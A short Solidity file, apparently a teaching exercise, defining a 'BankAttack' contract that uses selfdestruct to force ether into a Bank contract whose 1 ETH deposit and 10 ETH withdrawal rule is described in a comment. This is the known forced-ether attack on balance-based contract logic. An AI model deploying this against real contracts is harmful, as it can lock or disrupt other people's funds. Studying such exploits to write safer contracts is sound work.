// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.12;

// The owner can deposit 1 ETH whenever he wants.
// He can only withdraw when the deposited amount reaches 10 ETH.
contract BankAttack {
    Bank bankContract;

    constructor(Bank _bank) {
        bankContract = _bank;
    }

    fallback() external payable { }

    function attack() external {
        selfdestruct(payable(address(bankContract)));
    }
}
